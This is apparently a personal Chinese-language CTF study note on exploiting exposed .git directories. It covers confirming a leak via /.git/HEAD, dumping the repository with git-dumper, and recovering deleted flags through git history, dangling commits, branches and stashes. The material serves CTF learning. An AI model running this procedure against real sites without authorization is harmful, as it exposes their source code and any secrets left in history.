# Web笔记09-Git泄露解题手册（小白版）

> 用途：.git 泄露题完整解题流程，照着做就能拿 flag

## 一、git 是什么（先懂概念）

- git = 代码的"时光机"：程序员每次 `git commit` 拍一张快照，可回到任意历史版本
- **CTF 关键**：出题人以为删掉的 flag（历史版本里的），时光机里全留着
- .git 泄露 = 时光机被偷 = 所有历史版本白送

## 二、发现 .git 泄露（30秒）

```bash
curl.exe https://靶机/.git/HEAD
# 返回 "ref: refs/heads/master" = 实锤
```

> 注意：`/.git/` 目录本身 403 是正常的（nginx 禁止列目录），
> 只要 `/.git/HEAD` 200 就是泄露。403 ≠ 安全。

## 三、完整流程（5 个动作）

```
① 验证    curl /.git/HEAD
② 下载    git-dumper（工具！）
③ 进入    本地仓库目录
④ 列表    git ls-files（看有什么文件）
⑤ 搜索    grep 文件内容 / git_search.py
```

### 动作 ②：下载（用工具）

```bash
python -m git_dumper https://靶机/.git/ C:\Users\Administrator\Desktop\git_leak
# 前面 = 服务器 .git/ 地址，后面 = 存到本地哪
# 看到一堆 [200] 滚动 + "Running git checkout ." = 成功
```

### 动作 ④⑤：分析（用命令）

```bash
cd C:\Users\Administrator\Desktop\git_leak

git ls-files                        # 当前所有文件
git log --oneline --all             # 所有提交历史（--all 别漏！）
git show <哈希>                      # 看某次提交改了什么（含被删内容）
git show <哈希>:<文件名>              # 看某提交里的某个文件
git fsck --lost-found               # 找被删的悬空提交（尸体搜索）
git branch -a                       # 隐藏分支
git stash list                      # 暂存
git reflog                          # 操作记录
```

## 四、工具 vs 命令 的分工（核心认知）

| 阶段 | 用什么 | 为什么 |
|---|---|---|
| 下载 | **工具**（git-dumper） | 手动抓几十个压缩对象太痛苦 |
| 分析 | **命令**（git 系列） | git 自己最懂仓库 |

## 五、4 种藏法 → 解法（对照表）

| 藏法 | 解法 | 例子 |
|---|---|---|
| flag 在**当前版本**文件里 | `git ls-files` + 搜内容 | DASCTF Git测试 |
| flag 在**历史提交**里 | `git log` → `git show <哈希>` | NSSCTF 3862 |
| flag 在**悬空提交**里 | `git fsck --lost-found` | 进阶题 |
| flag 在**隐藏分支/暂存**里 | `git branch -a` / `git stash list` | 进阶题 |

## 六、一键搜索脚本（不用手动翻）

```bash
python git_search.py <仓库目录>
# 自动：遍历所有版本所有文件搜 flag + 悬空对象 + 提交说明 + 分支/暂存
```

**脚本位置**：`my_learning/web/git_search.py`

## 七、常见坑

- Windows 下 git 输出可能 GBK 乱码 → 脚本已用 UTF-8 容错解码
- 提交说明是关键提示：`flag`/`delete`/`remove` 的提交必看
- `git log` 默认只看当前分支 → 加 `--all`
- 悬空对象不一定在 fsck 结果里 → 配合 `git reflog` 找被 reset 的提交
